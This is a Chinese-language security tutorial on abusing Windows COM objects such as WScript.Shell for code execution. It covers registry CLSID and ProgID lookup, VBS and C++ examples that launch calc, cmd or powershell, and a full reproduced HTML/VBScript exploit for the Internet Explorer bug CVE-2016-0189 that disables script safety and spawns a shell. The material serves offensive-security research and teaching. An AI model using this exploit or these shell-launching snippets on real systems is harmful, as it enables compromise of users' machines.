# COM对象的利用与挖掘

## 前言

&emsp;&emsp;本文在FIREEYE的研究[Hunting COM Objects](https://www.fireeye.com/blog/threat-research/2019/06/hunting-com-objects.html)的基础上，讲述COM对象在IE漏洞和OFFICE宏中的利用方式以及如何挖掘可利用的COM对象。

## COM对象简述

&emsp;&emsp;COM(微软组件对象模型)，是一种独立于平台的分布式系统，用于创建可交互的二进制软件组件。 COM 是 Microsoft 的 OLE (复合文档) 和 ActiveX (支持 Internet 的组件) 技术的基础技术。

&emsp;&emsp;注册表项：`HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID`下，包含COM对象的所有公开的信息，图中显示了Wscript.Shell对象在注册表中的信息：

![image-20210622125211899](C:\Users\zhangjunyi01\AppData\Roaming\Typora\typora-user-images\image-20210622125211899.png)

&emsp;&emsp;其中`{72C24DD5-D70A-438B-8A42-98424B88AFB8}`就是该对象的CLSID。如果将COM对象比作人的话，CLSID就相当于身份证号，每个COM对象的CLSID都是唯一且不重复的。当然，人如果只有身份证号的话，日常生活就会很不方便，于是每个人都有自己的名字。那么COM对象中的ProgID就相当于它的名字，图中的COM对象ProgID为WScript.Shell.1：

![image-20210622131240674](C:\Users\zhangjunyi01\AppData\Roaming\Typora\typora-user-images\image-20210622131240674.png)

&emsp;&emsp;而InProcServer32表示该COM对象位于哪个PE文件中，图中表示WScript.Shell对象位于`C:\Windows\System32\wshom.ocx`中：

![InProcServer32](C:\Users\zhangjunyi01\AppData\Roaming\Typora\typora-user-images\image-20210622125130348.png)

&emsp;&emsp;有了上述的信息后，接下来便可以通过这些信息去使用COM对象了。

## COM对象的利用

&emsp;&emsp;COM对象可以通过脚本语言（VBS、JS）、高级语言（C++）和powershell创建。接下来分别介绍这三种创建方式。

### 脚本语言创建COM对象

&emsp;&emsp;通过脚本语言，我们可以很轻易的创建一个COM对象，使用VBS创建Wscript.Shell对象：

```vbscript
Dim Shell
Set Shell = CreateObject("Wscript.Shell")
Shell.Run "cmd /c calc.exe"
```

&emsp;&emsp;运行效果如图：

![VBS](C:\Users\zhangjunyi01\AppData\Roaming\Typora\typora-user-images\image-20210621184952224.png)

&emsp;&emsp;`CreateObject`方法使用COM对象的ProgID：Wscript.Shell来创建对象，创建完成后便能调用该对象的Run方法通过cmd起calc。除了 使用ProgID，还可以使用Wscript.Shell对象的CLSID来创建：

```vbscript
Dim Shell
Set Shell = GetObject("new:72C24DD5-D70A-438B-8A42-98424B88AFB8")
Shell.Run "cmd /c calc.exe"
```

&emsp;&emsp;这种方法的好处是当想要创建的COM对象没有ProgID时，便可以通过CLSID进行创建。接下来对[CVE-2016-0189](https://github.com/theori-io/cve-2016-0189/blob/master/exploit/vbscript_godmode.html)的EXP进行改造，使之启动cmd执行calc：

```html
<html>
<head>
<meta http-equiv="x-ua-compatible" content="IE=10">
</head>
<body>
    <script type="text/vbscript">
        Dim aw
        Dim plunge(32)
        Dim y(32)
        prefix = "%u4141%u4141"
        d = prefix & "%u0016%u4141%u4141%u4141%u4242%u4242"
        b = String(64000, "D")
        c = d & b
        x = UnEscape(c)

        Class ArrayWrapper
            Dim A()
            Private Sub Class_Initialize
                ' 2x2000 elements x 16 bytes / element = 64000 bytes
                ReDim Preserve A(1, 2000)
            End Sub
            Public Sub Resize()
                ReDim Preserve A(1, 1)
            End Sub
        End Class
        Class Dummy
        End Class
        Function getAddr (arg1, s)
            aw = Null
            Set aw = New ArrayWrapper
            For i = 0 To 32
                Set plunge(i) = s
            Next
            Set aw.A(arg1, 2) = s
            Dim addr
            Dim i
            For i = 0 To 31
                If Asc(Mid(y(i), 3, 1)) = VarType(s) Then
                    addr = strToInt(Mid(y(i), 3 + 4, 2))
                End If
                y(i) = Null
            Next
            If addr = Null Then
                document.location.href = document.location.href
                Return
            End If
            getAddr = addr
        End Function
        Function leakMem (arg1, addr)
            d = prefix & "%u0008%u4141%u4141%u4141"
            c = d & intToStr(addr) & b
            x = UnEscape(c)
            aw = Null
            Set aw = New ArrayWrapper
            Dim o
            o = aw.A(arg1, 2)
            leakMem = o
        End Function
        Sub overwrite (arg1, addr)
            d = prefix & "%u400C%u0000%u0000%u0000"
            c = d & intToStr(addr) & b
            x = UnEscape(c)
            aw = Null
            Set aw = New ArrayWrapper
            ' Single has vartype of 0x04
            aw.A(arg1, 2) = CSng(0)
        End Sub

        Function exploit (arg1)
            Dim addr
            Dim csession
            Dim olescript
            Dim mem

            ' Create a vbscript class instance
            Set dm = New Dummy
            ' Get address of the class instance
            addr = getAddr(arg1, dm)
            ' Leak CSession address from class instance
            mem = leakMem(arg1, addr + 8)
            csession = strToInt(Mid(mem, 3, 2))
            ' Leak COleScript address from CSession instance
            mem = leakMem(arg1, csession + 4)
            olescript = strToInt(Mid(mem, 1, 2))
            ' Overwrite SafetyOption in COleScript (e.g. god mode)
            ' e.g. changes it to 0x04 which is not in 0x0B mask
            overwrite arg1, olescript + &H174

            ' Execute cmd
            Set Object = CreateObject("Shell.Application")
            Object.ShellExecute "cmd"
        End Function
        Function triggerBug
            ' Resize array we are currently indexing
            aw.Resize()

            ' Overlap freed array area with our exploit string
            Dim i
            For i = 0 To 32
                ' 24000x2 + 6 = 48006 bytes
                y(i) = Mid(x, 1, 24000)
            Next
        End Function
    </script>

    <script type="text/javascript">
        function strToInt(s)
        {
            return s.charCodeAt(0) | (s.charCodeAt(1) << 16);
        }
        function intToStr(x)
        {
            return String.fromCharCode(x & 0xffff) + String.fromCharCode(x >> 16);
        }
        var o;
        o = {"valueOf": function () {
                triggerBug();
                return 1;
            }};
        setTimeout(function() {exploit(o);}, 50);
    </script>
</body>
</html>
```

&emsp;&emsp;将EXP中如下vbs代码替换成创建Wscript.Shell即可

```vbscript
' Execute cmd
Set Object = CreateObject("Shell.Application")
Object.ShellExecute "cmd"
```

&emsp;&emsp;最终实现效果：

![EXP替换](C:\Users\zhangjunyi01\AppData\Roaming\Typora\typora-user-images\image-20210621211738094.png)

### 通过高级语言创建COM对象

&emsp;&emsp;

```c++
#define _WIN32_DCOM
using namespace std;
#include <comdef.h>

#pragma comment(lib, "stdole2.tlb")

int main(int argc, char** argv)
{
    HRESULT hres;

    // Step 1: ------------------------------------------------
    // 初始化COM组件. ------------------------------------------

    hres = CoInitializeEx(0, COINIT_MULTITHREADED);

    // Step 2: ------------------------------------------------
    // 初始化COM安全属性 ---------------------------------------

    hres = CoInitializeSecurity(
        NULL,
        -1,                          // COM negotiates service
        NULL,                        // Authentication services
        NULL,                        // Reserved
        RPC_C_AUTHN_LEVEL_DEFAULT,   // Default authentication 
        RPC_C_IMP_LEVEL_IMPERSONATE, // Default Impersonation
        NULL,                        // Authentication info
        EOAC_NONE,                   // Additional capabilities 
        NULL                         // Reserved
    );
    // Step 3: ---------------------------------------
    // 获取COM组件的接口和方法 -------------------------
    LPDISPATCH lpDisp;
    CLSID clsidshell;
    hres = CLSIDFromProgID(L"WScript.Shell", &clsidshell);
    if (FAILED(hres))
        return FALSE;
    hres = CoCreateInstance(clsidshell, NULL, CLSCTX_INPROC_SERVER, IID_IDispatch, (LPVOID*)&lpDisp);
    if (FAILED(hres))
        return FALSE;
    LPOLESTR pFuncName = L"Run";
    DISPID Run;
    hres = lpDisp->GetIDsOfNames(IID_NULL, &pFuncName, 1, LOCALE_SYSTEM_DEFAULT, &Run);
    if (FAILED(hres))
        return FALSE;
    // Step 4: ---------------------------------------
    // 填写COM组件参数并执行方法 -----------------------
    VARIANTARG V[1];
    V[0].vt = VT_BSTR;
    V[0].bstrVal = _bstr_t(L"powershell.exe");
    DISPPARAMS disParams = { V, NULL, 1, 0 };
    hres = lpDisp->Invoke(Run, IID_NULL, LOCALE_SYSTEM_DEFAULT, DISPATCH_METHOD, &disParams, NULL, NULL, NULL);
    if (FAILED(hres))
        return FALSE;
    // Clean up
    //--------------------------
    lpDisp->Release();
    CoUninitialize();
    return 1;
}
```

